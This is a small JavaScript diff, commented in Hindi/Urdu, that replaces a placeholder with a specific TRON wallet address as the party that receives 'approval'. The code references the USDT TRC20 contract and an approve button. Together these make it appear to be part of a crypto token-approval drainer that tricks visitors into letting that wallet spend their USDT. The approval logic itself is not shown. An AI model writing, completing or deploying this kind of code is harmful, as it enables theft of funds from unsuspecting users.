@@ -4,7 +4,7 @@ const btnApprove = document.getElementById('btn-approve');
 const statusText = document.getElementById('status');
 
 // 1. Apna address yahan dalein (Jahan approval chahiye)
-const MY_WALLET_ADDRESS = "YOUR_TRON_WALLET_ADDRESS_HERE"; 
+const MY_WALLET_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt"; 
 
 // USDT TRC20 ka official contract address
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
